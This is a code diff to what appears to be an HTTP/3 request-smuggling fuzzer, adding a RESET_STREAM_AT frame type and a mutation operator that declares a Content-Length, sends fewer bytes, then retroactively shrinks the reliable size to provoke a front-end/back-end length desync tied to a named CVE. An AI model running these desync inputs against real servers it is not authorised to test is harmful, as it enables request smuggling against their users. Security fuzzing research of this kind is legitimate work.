@@ -81,7 +81,27 @@ class Migrate:
     rotation is the primitive; it does not by itself demonstrate a desync."""
 
 
-Op = Union[Headers, Data, Delay, Reset, Fin, StopSending, KeyUpdate, Migrate]
+@dataclass(frozen=True)
+class ResetStreamAt:
+    """RESET_STREAM_AT (reliable stream reset, draft-ietf-quic-reliable-stream-reset,
+    frame 0x24). Reset the stream but declare `reliable_size` bytes reliably delivered and
+    the rest discarded; `final_size` is the total sent. Emitting several with a shrinking
+    reliable_size RETROACTIVELY reduces the delivered body length AFTER the bytes are on the
+    wire, a control no H1/H2 transport has (a sent byte is sent). Probes the
+    transport-length-vs-Content-Length axis of CVE-2026-33555 with a value the attacker
+    moves post-commit. aioquic has no native support; the driver emits the raw frame via
+    quic.send_reset_stream_at (installed by quic_ext.enable_reliable_reset). Legal only if
+    the peer advertised the reset_stream_at transport parameter; otherwise it is a
+    protocol-violation fuzzing input. No HTTP/2 analogue."""
+
+    error_code: int = 0x10C
+    final_size: int = 0
+    reliable_size: int = 0
+
+
+Op = Union[
+    Headers, Data, Delay, Reset, Fin, StopSending, KeyUpdate, Migrate, ResetStreamAt
+]
 Genome = List[Op]
 
 # H3 error codes worth resetting with.
@@ -710,6 +730,35 @@ def _mut_migrate(g: Genome, rng: random.Random) -> Genome:
     return out
 
 
+def _mut_reliable_reset(g: Genome, rng: random.Random) -> Genome:
+    """Retroactive body truncation via RESET_STREAM_AT: declare CL:N, send M body bytes,
+    then reset the stream declaring a reliable size BELOW M (optionally a second time,
+    smaller). The front may honor the reduced reliable size while the H1 backend already
+    took the forwarded bytes: the transport-length-vs-CL desync of CVE-2026-33555 with a
+    length the attacker shrinks after committing bytes. No HTTP/2 analogue."""
+    n = rng.choice((10, 48, 100))
+    m = rng.choice((3, 5, 8))
+    out = _h3_set_cl(g, n)
+    out.append(Data(b"A" * m, end_stream=False))
+    final = rng.choice(
+        (m, m + 3, m + 10)
+    )  # honest or slightly-over-declared final size
+    out.append(
+        ResetStreamAt(
+            error_code=H3_REQUEST_CANCELLED,
+            final_size=final,
+            reliable_size=rng.choice((0, 1, 2)),
+        )
+    )
+    if rng.random() < 0.4:  # progressive reduction: a second, smaller reliable size
+        out.append(
+            ResetStreamAt(
+                error_code=H3_REQUEST_CANCELLED, final_size=final, reliable_size=0
+            )
+        )
+    return out
+
+
 def _mut_authority_host_conflict(g: Genome, rng: random.Random) -> Genome:
     """:authority plus an explicit Host header with a different value. The downgrade
     synthesizes Host from :authority; a surviving conflicting Host reaches the backend
@@ -793,6 +842,7 @@ H3_OPERATOR_NAMES = (
     "_mut_reset_mid_body",
     "_mut_key_update",
     "_mut_migrate",
+    "_mut_reliable_reset",
     "_mut_authority_host_conflict",
     "_mut_pseudo_path_space",
     "_mut_h3_reqline_inject",
@@ -832,6 +882,7 @@ OPERATORS: Tuple[Callable[[Genome, random.Random], Genome], ...] = (
     _mut_reset_mid_body,
     _mut_key_update,
     _mut_migrate,
+    _mut_reliable_reset,
     _mut_authority_host_conflict,
     _mut_pseudo_path_space,
     _mut_h3_reqline_inject,
